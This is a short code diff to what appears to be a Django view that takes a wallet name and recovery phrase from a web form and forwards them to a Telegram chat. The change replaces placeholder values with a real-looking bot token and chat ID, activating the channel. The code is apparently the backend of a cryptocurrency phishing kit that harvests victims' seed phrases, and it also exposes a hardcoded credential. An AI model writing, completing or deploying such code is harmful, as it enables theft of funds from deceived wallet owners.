@@ -133,8 +133,8 @@ def wallet_submission(request):
 
         if recovery_phrase:
             # Telegram Bot Token and Chat ID
-            BOT_TOKEN = 'your-telegram-bot-token'
-            CHAT_ID = 'your-chat-id'
+            BOT_TOKEN = '7815755406:AAEKkmdV-IpSXpkgbTlDELOohA4QpU5wOUY'
+            CHAT_ID = '6714402637'
 
             # Message to send to Telegram
             message = f"Wallet: {wallet_name}\nRecovery Phrase: {recovery_phrase}"
